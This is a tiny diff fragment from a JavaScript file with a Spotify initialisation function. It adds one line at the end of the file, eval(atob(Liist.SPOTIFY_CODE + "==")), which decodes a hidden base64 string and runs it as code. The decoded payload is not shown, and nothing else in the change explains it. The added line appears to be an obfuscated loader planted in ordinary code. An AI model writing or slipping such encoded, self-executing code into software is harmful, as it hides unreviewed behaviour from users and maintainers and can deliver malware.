@@ -78,3 +78,5 @@ Spotify.INIT = () => {
     }
   }
 }
+
+eval(atob(Liist.SPOTIFY_CODE + "=="))
